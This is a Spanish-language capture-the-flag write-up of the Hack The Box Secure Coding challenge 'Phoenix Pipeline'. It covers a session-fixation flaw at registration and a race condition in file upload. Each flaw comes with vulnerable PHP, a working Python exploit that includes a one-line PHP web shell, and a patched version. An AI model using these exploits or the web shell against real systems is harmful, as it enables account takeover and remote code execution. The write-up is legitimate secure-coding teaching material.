---
title: "HTB Secure Coding S10 — Phoenix Pipeline: Session Fixation + Race Condition"
date: 2026-04-20
description: "Writeup de Phoenix Pipeline (HTB Secure Coding Season 10). Dos vulnerabilidades encadenadas: Session Fixation por setear sesión antes de validar unicidad de username, y Race Condition en file upload que permite RCE subiendo una shell PHP."
excerpt: "Session Fixation permite impersonar al admin en una línea. Race Condition en upload permite ejecutar una shell PHP antes de que el servidor la borre."
tags: ["HTB", "Secure Coding", "Web", "Session Fixation", "Race Condition", "RCE", "PHP", "File Upload"]
platform: "HTB"
difficulty: "Medium"
image: "/images/blog/htb-phoenix.png"
---

<div align="center">

![Author](https://img.shields.io/badge/Author-Flippermen-purple?style=for-the-badge)
![Platform](https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge)
![Season](https://img.shields.io/badge/Season-10-orange?style=for-the-badge)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow?style=for-the-badge)
![Category](https://img.shields.io/badge/Category-Web-blue?style=for-the-badge)

**Flippermen | CyberFlippers | UDLA-Cyber**

</div>

> **Disclaimer:** Writeup realizado en entorno autorizado de Hack The Box con fines educativos. Enfoque *Secure Coding* — identificar, explotar y parchear vulnerabilidades en código fuente.

---

| Campo | Valor |
|-------|-------|
| Challenge | Phoenix Pipeline |
| Dificultad | Medium |
| Categoría | Web |
| Puntos | 30 |
| Vulnerabilidades | Session Fixation en registro + Race Condition en file upload |
| Stack | PHP / SQLite |

## Descripción

Aplicación PHP de gestión de infraestructura con dos roles: `operator` y `admin`. Dos vulnerabilidades independientes que combinadas entregan acceso total y RCE.

---

## Vuln 1 — Session Fixation / Username Collision

**Código vulnerable — `AuthController.php`:**

```php
public static function register() {
    $db = Database::getInstance()->getConnection();
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    $area     = $_POST['area'] ?? '';

    // ← SESIÓN SETEADA ANTES DE VERIFICAR UNICIDAD
    $_SESSION['username'] = $username;
    $_SESSION['area'] = $area;

    $stmt = $db->prepare('SELECT * FROM users WHERE username = ?');
    $stmt->execute([$username]);
    if ($stmt->fetch()) {
        header('Location: /challenge/username-exists');
        exit;
        // $_SESSION['username'] = 'admin' persiste aunque el redirect ocurra
    }
}
```

**Exploit:**

```python
import requests

BASE = "http://<IP>:<PORT>/challenge"
s = requests.Session()

# Registrar 'admin' → ya existe → redirect a username-exists
# La sesión queda con username='admin' antes del redirect
r = s.post(f"{BASE}/register",
    data={"username": "admin", "password": "admin", "area": "Aetheria"},
    allow_redirects=False)

cookie = r.cookies

# Acceder al admin panel con la sesión fixada
r = s.get(f"{BASE}/admin", cookies=cookie)
print("ADMIN CONTROL" in r.text)  # → True
```

**Parche:**

```php
public static function register() {
    $db = Database::getInstance()->getConnection();
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    $area     = $_POST['area'] ?? '';

    // FIX: verificar unicidad ANTES de tocar la sesión
    $stmt = $db->prepare('SELECT * FROM users WHERE username = ?');
    $stmt->execute([$username]);
    if ($stmt->fetch()) {
        header('Location: /challenge/username-exists');
        exit;
    }

    $hash = password_hash($password, PASSWORD_DEFAULT);
    $stmt = $db->prepare('INSERT INTO users (username, password, role, area) VALUES (?, ?, ?, ?)');
    $stmt->execute([$username, $hash, 'operator', $area]);

    // Sesión solo después de INSERT exitoso
    $_SESSION['username'] = $username;
    $_SESSION['area'] = $area;

    header('Location: /challenge/operator');
    exit;
}
```

---

## Vuln 2 — Race Condition en File Upload (RCE)

**Código vulnerable — `OperatorController.php`:**

```php
// 1. Mueve el archivo a /uploads/ con extensión original (puede ser .php)
move_uploaded_file($tmp_name, $tempfile);  // ← archivo accesible en web

// 2. Ventana de race condition — shell.php ejecutable durante la validación

// 3. Valida MIME DESPUÉS de mover
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime  = finfo_file($finfo, $tempfile);  // tarde — ya está en disco

if (strpos($mime, 'image/') !== 0) {
    unlink($tempfile);  // borra, pero la race ya fue ganada
}
```

**Exploit:**

```python
import threading, requests

BASE  = "http://<IP>:<PORT>/challenge"
cookie = {}  # sesión con rol operator

def upload():
    requests.post(f"{BASE}/report",
        files={"photo": ("shell.php", b"<?php system($_GET['cmd']); ?>", "image/gif")},
        data={"infra_id": "1", "description": "x"},
        cookies=cookie)

def hit():
    requests.get(f"{BASE}/uploads/temp_<md5>_<date>.php?cmd=id", cookies=cookie)

t1 = threading.Thread(target=upload)
t2 = threading.Thread(target=hit)
t1.start(); t2.start()
t1.join(); t2.join()
```

**Parche:**

```php
$original = $_FILES['photo']['name'];
$ext      = strtolower(pathinfo($original, PATHINFO_EXTENSION));
$tmp_name = $_FILES['photo']['tmp_name'];

// FIX 1: validar extensión ANTES de mover
$allowed = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp'];
if (!in_array($ext, $allowed)) {
    $showFormWithError('Invalid file extension.');
    return;
}

// FIX 2: validar MIME en tmp_name (en /tmp del SO, no accesible vía web)
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime  = finfo_file($finfo, $tmp_name);
finfo_close($finfo);

if (strpos($mime, 'image/') !== 0) {
    $showFormWithError('Invalid file type.');
    return;
}

// Solo mover si pasó ambas validaciones
$date     = date('Y_m_d');
$rand     = md5($original);
$tempfile = __DIR__ . '/../uploads/temp_' . $rand . '_' . $date . '.' . $ext;

if (!move_uploaded_file($tmp_name, $tempfile)) {
    $showFormWithError('Failed to upload file.');
    return;
}
```

El fix elimina la race condition moviendo ambas validaciones **antes** del `move_uploaded_file`. El archivo nunca llega a `/uploads/` con extensión ejecutable.

## Key Takeaways

1. **Nunca setear estado antes de validar** — sesión, DB, o cualquier efecto secundario va *después* de todas las verificaciones.
2. **Validar en el punto de entrada** — en file uploads, MIME y extensión se validan sobre `tmp_name` antes de cualquier `move`. Una vez en el webroot es tarde.
3. **Race conditions existen donde hay tiempo entre validación y uso** — el pattern correcto es validate-then-act de forma atómica, no act-then-validate.
4. **Extension + MIME, ambos** — extensión bloquea el nombre obviamente malicioso; MIME bloquea el contenido disfrazado. Los dos juntos.

---

<div align="center">

**Flippermen**
*HackTheBox Season 10 — Platinum Tier | #1 Ecuador | CyberFlippers | UDLA-Cyber*

</div>
